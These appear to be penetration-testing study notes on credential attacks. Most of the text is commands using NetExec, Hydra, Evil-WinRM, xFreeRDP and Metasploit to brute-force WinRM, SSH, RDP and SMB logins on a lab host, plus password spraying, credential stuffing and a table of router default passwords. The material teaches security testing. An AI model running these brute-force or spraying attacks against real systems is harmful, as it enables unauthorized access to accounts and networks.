## 1.Network Services

* During our penetration tests, every computer network we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific permissions and are assigned to specific users. Apart from web applications, these services include (but are not limited to) `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`.

### WinRM

**NetExec**

```shell-session
sudo apt-get -y install netexec
netexec -h
```

**NetExec Protocol-Specific Help**

NetExec currently supports remote authentication using NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC.

```shell-session
netexec smb -h
```

**NetExec Usage**

```shell-session
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
netexec winrm 10.129.42.197 -u user.list -p password.list
```

WINRM 10.129.42.197 5985 NONE \[+] None\user:password (Pwn3d!) ?

### **Evil-WinRM**

```shell-session
sudo gem install evil-winrm
evil-winrm -i <target-IP> -u <username> -p <password>
evil-winrm -i 10.129.42.197 -u user -p password
```

## SSH

### **Hydra - SSH**

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```

```shell-session
ssh user@10.129.42.197
user@10.129.42.197's password: ********
```

## Remote Desktop Protocol (RDP)

### Hydra

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

### xFreeRDP

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
xfreerdp /v:10.129.42.197 /u:user /p:password
```

## SMB

### Hydra - SMB

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

**Hydra - Error**

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

* This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

**Metasploit Framework**<br>

```shell-session
msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run
```

Now we can use `NetExec` again to view the available shares and what privileges we have for them.

**NetExec**

```shell-session
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```

**Smbclient**

```shell-session
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

* wordlist passwd

{% file src="/files/Zijf09uLLA3LRb49WXza" %}

***

## 2.Spraying, Credential Stuffing, and Defaults

### Password spraying

Depending on the target system, different tools may be used to carry out password spraying attacks. For web applications, [Burp Suite](https://portswigger.net/burp) is a strong option, while for Active Directory environments, tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) or [Kerbrute](https://github.com/ropnop/kerbrute) are commonly used.

```shell-session
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

### Credential stuffing

```shell-session
hydra -C user_pass.list ssh://10.100.38.23
```

#### Default credentials

{% embed url="<https://github.com/ihebski/DefaultCreds-cheat-sheet>" %}

```shell-session
pip3 install defaultcreds-cheat-sheet
```

* Once installed, we can use the `creds` command to search for known default credentials associated with a specific product or vendor.

```shell-session
creds search linksys
```

* <https://www.softwaretestinghelp.com/default-router-username-and-password-list/>

| **Router Brand** | **Default IP Address** | **Default Username** | **Default Password** |
| ---------------- | ---------------------- | -------------------- | -------------------- |
| 3Com             | <http://192.168.1.1>   | admin                | Admin                |
| Belkin           | <http://192.168.2.1>   | admin                | admin                |
| BenQ             | <http://192.168.1.1>   | admin                | Admin                |
| D-Link           | <http://192.168.0.1>   | admin                | Admin                |
| Digicom          | <http://192.168.1.254> | admin                | Michelangelo         |
| Linksys          | <http://192.168.1.1>   | admin                | Admin                |
| Netgear          | <http://192.168.0.1>   | admin                | password             |
